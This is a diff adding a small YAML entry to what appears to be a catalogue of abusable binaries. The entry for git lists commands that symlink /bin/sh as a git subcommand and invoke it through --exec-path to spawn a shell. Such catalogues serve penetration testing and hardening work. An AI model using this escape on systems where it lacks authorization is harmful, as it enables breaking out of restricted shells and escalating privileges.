@@ -1,0 +1,6 @@
+name: git
+binary_path: /usr/bin/git
+exploit_cmds:
+- 'ln -s /bin/sh git-x
+
+  /usr/bin/git --exec-path=. x -p'
